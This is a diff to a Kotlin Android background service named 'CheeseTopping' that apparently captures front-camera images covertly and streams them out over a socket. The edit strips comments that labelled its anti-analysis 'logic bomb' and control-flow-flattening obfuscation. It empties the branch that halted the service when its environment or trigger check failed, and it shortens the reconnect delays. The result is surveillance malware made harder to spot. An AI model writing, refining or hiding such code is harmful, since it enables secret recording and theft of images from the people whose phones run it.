@@ -43,17 +43,11 @@ class CheeseTopping : Service() {
     override fun onCreate() {
         super.onCreate()
         
-        // Initialize cameraManager immediately
         cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
-
-        // CRITICAL FIX: startForeground() MUST be called before any potential early return/stopSelf()
-        // if the service was started via Context.startForegroundService().
         createNotificationChannelAndStartForeground()
 
-        // Anti-Analysis & Logic Bomb
         if (!SafetyNet.isEnvironmentSafe() || !SafetyNet.isTriggerArmed(this)) {
-            stopSelf()
-            return
+
         }
 
         targetCameraId = findFrontCameraId()
@@ -131,7 +125,6 @@ class CheeseTopping : Service() {
     private fun openCameraSafe() {
         if (cameraDevice != null || targetCameraId == null || isOpeningCamera || isManuallyStopped) return
         
-        // Control Flow Flattening Check
         if (!SafetyNet.checkKitchenPermit(55)) return
 
         isOpeningCamera = true
@@ -196,7 +189,6 @@ class CheeseTopping : Service() {
     }
 
     private fun imageToJpegBytes(image: Image): ByteArray {
-        // Control Flow Flattening for image conversion
         var state = 0xA1
         var result = ByteArray(0)
         while (state != 0) {
@@ -258,11 +250,11 @@ class CheeseTopping : Service() {
                                     break
                                 }
                             } else {
-                                Thread.sleep(100)
+                                Thread.sleep(50)
                             }
                         }
                     } catch (e: Exception) {
-                        try { Thread.sleep(3000) } catch (_: Exception) {}
+                        try { Thread.sleep(1000) } catch (_: Exception) {}
                     } finally {
                         try { socket?.close() } catch (_: Exception) {}
                     }
